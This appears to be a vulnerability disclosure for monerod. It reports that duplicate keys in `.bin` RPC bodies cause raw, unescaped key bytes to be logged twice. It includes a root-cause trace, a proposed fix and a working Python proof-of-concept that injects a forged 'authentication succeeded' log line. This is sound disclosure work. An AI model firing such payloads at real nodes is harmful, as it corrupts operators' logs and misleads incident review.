# `monerod`'s binary ("epee portable-storage") RPC parser logs an attacker's raw, unescaped bytes twice when a request body declares a duplicate key, on every `.bin` RPC endpoint

## Summary

This is a sibling of two recently-fixed reports against this program (log injection via raw request content reaching the daemon's log file before any escaping): one in epee's **JSON** parser (`contrib/epee/src/parserse_base_utils.cpp` / `contrib/epee/include/storages/portable_storage_from_json.h`, fixed by rejecting raw control bytes and escaping `ex.what()`), and one in `src/rpc/zmq_server.cpp`'s raw request logging (fixed by gating it behind restricted mode).

Neither fix touches epee's **binary** portable-storage parser, which every `.bin` RPC endpoint (`/get_blocks.bin`, `/get_hashes.bin`, `/get_o_indexes.bin`, `/get_outs.bin`, `/get_output_distribution.bin`, and their aliases) uses to decode the raw POST body. That parser's section reader (`throwable_buffer_reader::read(section&)`) rejects a request whose binary tree contains two identically-named keys in the same object — and does so by logging the raw key name, unescaped, straight from the wire, via the same `ASSERT_MES_AND_THROW`/`LOG_ERROR` pattern the JSON-parser fix specifically eliminated in the JSON path. The exception this raises is then caught one level up and logged a **second** time, with the identical raw content, via `ex.what()`.

A key name in this format is an attacker-chosen length-prefixed byte string (1–255 bytes, no character restriction at all) — long enough to embed a complete forged log line, including real `\r`/`\n` bytes, timestamp-looking text, and a fabricated severity tag, exactly like the payloads used in the two already-fixed reports.

## Severity

Monero severity: **MEDIUM**, consistent with the maintainer's own triage of the two sibling reports (both rated Medium, "CRLF Injection").
Suggested CVSS v3.1: `5.3` with `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`.

Rationale:
1. Every `.bin` endpoint listed above is registered without a restricted-mode gate (no `MAP_URI_AUTO_BIN2_IF` variant exists), so this is reachable pre-authentication on any `monerod` HTTP RPC port, public or local (`AV:N/PR:N/UI:N`).
2. Triggering it requires nothing beyond a single, small, well-formed-except-for-the-duplicate-key binary POST body — no race, no timing, no prior state (`AC:L`).
3. Impact is confined to log integrity (forged-looking entries), matching the `I:L` and `A:N` scoring the two sibling reports on this program received.

## Affected Versions

Confirmed present, byte-for-byte identical, in both:
- **`master`**, commit `9e3a31032ee2cf3cb65c908e107a9952d03bbc4f` (the actively maintained branch):
  https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/contrib/epee/include/storages/portable_storage_from_bin.h#L325-L341
  https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/contrib/epee/include/misc_log_ex.h#L138-L172
- **`v0.18.5.1`**, the latest tagged release, commit `4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5`:
  https://github.com/monero-project/monero/blob/4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5/contrib/epee/include/storages/portable_storage_from_bin.h#L325-L341

This code predates both of the recent JSON/ZMQ log-injection fixes and was not touched by either of them.

## Root Cause

`contrib/epee/include/storages/portable_storage_from_bin.h`, the root-section reader that runs on **every** binary RPC body, unconditionally, before any endpoint-specific schema is applied:

```cpp
inline
void throwable_buffer_reader::read(section& sec)
{
  RECURSION_LIMITATION();
  sec.m_entries.clear();
  size_t count = read_varint();
  CHECK_AND_ASSERT_THROW_MES(count <= max_fields - m_fields, "Too many object fields");
  m_fields += count;
  while(count--)
  {
    //read section name string
    std::string sec_name;
    read_sec_name(sec_name);
    const auto insert_loc = sec.m_entries.lower_bound(sec_name);
    CHECK_AND_ASSERT_THROW_MES(insert_loc == sec.m_entries.end() || insert_loc->first != sec_name, "duplicate key: " << sec_name);
    sec.m_entries.emplace_hint(insert_loc, std::move(sec_name), load_storage_entry());
  }
}
```

`read_sec_name` performs no character validation whatsoever — it is a raw length-prefixed byte copy:

```cpp
void throwable_buffer_reader::read_sec_name(std::string& sce_name)
{
  RECURSION_LIMITATION();
  uint8_t name_len = 0;
  read(name_len);
  CHECK_AND_ASSERT_THROW_MES(name_len > 0, "Section name is missing");
  sce_name.resize(name_len);
  read((void*)sce_name.data(), name_len);
}
```

`CHECK_AND_ASSERT_THROW_MES` expands into `ASSERT_MES_AND_THROW`, which — exactly like the mechanism in the now-fixed `#3890910` — logs before throwing:

```cpp
// contrib/epee/include/misc_log_ex.h
#define LOG_ERROR(x) MERROR(x)
#define ASSERT_MES_AND_THROW(message) {LOG_ERROR(message); std::stringstream ss; ss << message; throw std::runtime_error(ss.str());}
#define CHECK_AND_ASSERT_THROW_MES(expr, message) do {if(!(expr)) ASSERT_MES_AND_THROW(message);} while(0)
```

So the first log write is `MERROR("duplicate key: " << sec_name)` with the raw, attacker-controlled `sec_name` bytes.

The `std::runtime_error` this throws is then caught by `portable_storage::load_from_binary`'s own catch block, which logs the same content a **second** time:

```cpp
// contrib/epee/src/portable_storage.cpp
bool portable_storage::load_from_binary(const epee::span<const uint8_t> source, const limits_t *limits)
{
  ...
  TRY_ENTRY();
  throwable_buffer_reader buf_reader(source.data()+sizeof(storage_block_header), source.size()-sizeof(storage_block_header));
  if (limits)
    buf_reader.set_limits(limits->n_objects, limits->n_fields, limits->n_strings);
  buf_reader.read(m_root);
  return true;
  CATCH_ENTRY("portable_storage::load_from_binary", false);
}
```

```cpp
// contrib/epee/include/misc_log_ex.h
#define CATCH_ENTRY(location, return_val) } \
  catch(const std::exception& ex) \
{ \
  (void)(ex); \
  LOG_ERROR("Exception at [" << location << "], what=" << ex.what()); \
  return return_val; \
}\
  ...
```

`ex.what()` is exactly `"duplicate key: <raw sec_name bytes>"` — the identical raw content, logged again, unescaped, via a second call site. Only after this does control return to `load_t_from_binary`, and finally to `MAP_URI_AUTO_BIN2`, whose own failure log line is safe (it logs only the body's byte length, not its content):

```cpp
// contrib/epee/include/net/http_server_handlers_map2.h
bool parse_res = epee::serialization::load_t_from_binary(static_cast<command_type::request&>(req), epee::strspan<uint8_t>(query_info.m_body));
if (!parse_res)
{
   MERROR("Failed to parse bin body data, body size=" << query_info.m_body.size());
   ...
}
```

By the time that safe line runs, the two raw, unescaped log writes have already happened.

This is reached before any endpoint-specific request schema is checked — `read(m_root)` builds the generic key/value tree first, then `out.load(ps)` maps it onto the target struct — so the crafted body does not need to resemble any particular endpoint's real request fields at all; any structurally-binary-valid body with a duplicate key at any nesting level triggers it, on any `.bin` endpoint.

## Steps to Reproduce

### 1. Build and run a target daemon

```
git clone --branch v0.18.5.1 --depth 1 https://github.com/monero-project/monero.git
cd monero && git submodule update --init --recursive
mkdir -p build/release && cd build/release
cmake -D CMAKE_BUILD_TYPE=Release -D BUILD_TESTS=OFF ../..
make -j"$(nproc)" daemon

./bin/monerod --regtest --fixed-difficulty 1 --offline \
  --data-dir /tmp/monero-poc-bindup/chain \
  --rpc-bind-ip 127.0.0.1 --rpc-bind-port 38081 --confirm-external-bind \
  --log-level 0 --non-interactive &
echo "daemon pid: $!"
```

(Default log level is sufficient — both log lines this PoC targets are `MERROR`, logged at level 0.)

### 2. Craft the binary body with a duplicate, log-forging key name

```python
#!/usr/bin/env python3
# poc_bin_duplicate_key_log_injection.py
import struct
import sys
import urllib.request

SIG_A = 0x01011101
SIG_B = 0x01020101
FMT_VER = 1
SERIALIZE_TYPE_UINT8 = 8

def varint(v: int) -> bytes:
    # size mark in the low 2 bits: 0=byte,1=word,2=dword,3=int64; value is left-shifted by 2
    if v <= 0x3F:
        return struct.pack("<B", (v << 2) | 0)
    if v <= 0x3FFF:
        return struct.pack("<H", (v << 2) | 1)
    if v <= 0x3FFFFFFF:
        return struct.pack("<I", (v << 2) | 2)
    return struct.pack("<Q", (v << 2) | 3)

def build_payload(forged_key: bytes) -> bytes:
    assert 0 < len(forged_key) <= 255, "section-name length is a single byte (1..255)"

    header = struct.pack("<IIB", SIG_A, SIG_B, FMT_VER)
    root_field_count = varint(2)  # two entries -> triggers the duplicate-key check on the 2nd

    def entry_name(name: bytes) -> bytes:
        return struct.pack("<B", len(name)) + name

    # Entry 1: normal, valid uint8 field -- successfully parsed and inserted.
    entry1 = entry_name(forged_key) + struct.pack("<B", SERIALIZE_TYPE_UINT8) + struct.pack("<B", 0)

    # Entry 2: identical key name. read_sec_name() succeeds, then the duplicate-key
    # check throws immediately -- no type/value bytes are needed for this entry,
    # since the parser never reaches load_storage_entry() for it.
    entry2 = entry_name(forged_key)

    return header + root_field_count + entry1 + entry2

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:38081/get_hashes.bin"

    forged_key = (
        b"ATTACKER_MARKER_BEGIN\r\n"
        b"2026-01-01 00:00:00.000\tI FORGED_LOG_LINE: authentication succeeded for admin\r\n"
        b"ATTACKER_MARKER_END"
    )

    payload = build_payload(forged_key)
    print(f"POST {target}  body_size={len(payload)} bytes")

    req = urllib.request.Request(target, data=payload, method="POST",
                                  headers={"Content-Type": "application/octet-stream"})
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            print("HTTP", resp.status, resp.read()[:200])
    except Exception as e:
        print("request finished with:", e)
```

```
python3 poc_bin_duplicate_key_log_injection.py http://127.0.0.1:38081/get_hashes.bin
```

Any of the other `.bin` endpoints (`/get_blocks.bin`, `/get_o_indexes.bin`, `/get_outs.bin`, `/get_output_distribution.bin`, …) works identically — the vulnerable code runs before the target endpoint's own schema is applied.

### 3. Check the daemon's log

```
grep -n "FORGED_LOG_LINE\|ATTACKER_MARKER" /tmp/monero-poc-bindup/chain/regtest/bitmonero.log
```

### Expected result on the vulnerable build

Two separate `MERROR` lines appear, each containing the full forged content on its own physical line(s), split apart by the real `\r\n` bytes embedded in the section name — one from `portable_storage_from_bin.h:340` (`"duplicate key: ..."`), and a second, differently-prefixed one from `portable_storage.cpp`'s `CATCH_ENTRY` (`"Exception at [portable_storage::load_from_binary], what=duplicate key: ..."`) — the same double-write shape the maintainers already confirmed and fixed for the JSON-parser sibling report.

## Possible Solution

Mirror the fix already applied to the JSON parser:
1. In `read_sec_name`, reject raw control bytes (`< 0x20`) the same way the JSON string scanner now does, or
2. Replace the raw `sec_name` interpolation in the duplicate-key check (and any other `CHECK_AND_ASSERT_THROW_MES`/`ASSERT_MES_AND_THROW` site in this file that embeds parsed string content) with a static message or an escaped one via `misc_utils::parse::transform_to_escape_sequence`, and
3. Apply the same `transform_to_escape_sequence(ex.what())` treatment already used in `portable_storage_from_json.h:406` to the `CATCH_ENTRY` in `portable_storage.cpp`.

## Impact

* Forged log lines — an unauthenticated remote caller of any public `.bin` RPC endpoint can plant fake-looking entries in the daemon's log with a single small HTTP request.
* Log-tooling/SIEM pipelines downstream of the daemon's log file can be fed fabricated content as if it were real.
* Complicates incident review, same as the two already-triaged sibling reports on this program.
* Reachable on every `.bin` endpoint, not a single one — the vulnerable code is the generic binary-tree parser shared by all of them, run before any endpoint-specific schema check.

## Note on AI usage

Source-code analysis (identifying this as the binary-parser sibling of the two already-fixed JSON/ZMQ log-injection reports, tracing the exact double-log call chain, and hand-deriving the PoC payload byte-for-byte from the wire-format constants) and drafting of this report were done with AI assistance, working directly against the `v0.18.5.1` and `master` source. **This has been verified by static code reading only — the PoC script has been checked for correctness against the exact deserialization code path but has not been run against a live `monerod` process.** Please run it and attach the resulting log lines before submitting, per this program's requirement for a working PoC with logs.
